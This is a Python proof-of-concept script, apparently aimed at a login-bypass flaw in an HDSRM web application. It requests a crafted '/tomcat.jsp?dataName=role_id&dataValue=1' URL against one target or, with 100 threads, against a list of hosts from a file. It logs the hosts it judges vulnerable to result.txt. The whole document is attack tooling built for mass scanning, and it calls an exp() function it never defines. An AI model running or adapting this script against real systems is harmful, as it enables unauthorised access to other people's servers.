import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'
def banner():
    text ='''                              
  __   __   __  ___   __  _  _   _ _   _ 
 / / _ \ \ /  \/ / | /  \| || | | | | | |
| |_/ \_| ( ()  <| || || ) || |_| | |_| |
 \___^___/ \__/\_\\_   _/ \_) ._,_|\___/ 
                    | |     | |          
                    |_|     |_|          wh
'''
    print(text)
def main():
    banner()
    parser=argparse.ArgumentParser(description="HDSRM_Login_bypass")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help="input file path")
    args =parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        if poc(args.url):
           exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open('dh.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
                # i = i.strip()
                # if 'https://' in i: #给资产自动添加http://
                #     url_list.append(i)
                # else:
                #     i = 'http://' + i
                #     url_list.append(i)
        mp =Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload_url = '/tomcat.jsp?dataName=role_id&dataValue=1'
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'42',
    }
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        # match = re.search(r'"/login/login"',res.text)#正则匹配
        if res.status_code == 200 and "role_id" in res.text:
            print(f"[+]该{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                 fp.write(target+"\n")
        else:
            print(f"[-]该{target}不存在漏洞")
    except Exception as e:#异常处理
        print(f"[*]该url存在问题{target},请手动测试",e)
if __name__ == '__main__':
    main()
